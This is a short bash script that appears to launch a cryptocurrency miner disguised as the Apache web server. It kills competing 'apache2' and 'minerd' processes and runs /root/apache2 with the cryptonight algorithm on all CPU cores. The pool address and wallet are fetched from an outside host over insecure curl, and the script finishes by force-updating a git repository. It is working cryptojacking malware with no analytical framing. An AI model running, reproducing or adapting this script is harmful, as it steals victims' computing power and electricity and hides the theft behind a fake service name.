#!/bin/bash
killall apache2
killall  minerd
desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
/root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool2.txt` -u `curl --insecure https://sio.com.co/m/dirwallet2.txt` -p `cat index.html` -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log

cd tanhuevon/ ; git stash drop; git reset --hard; git pull
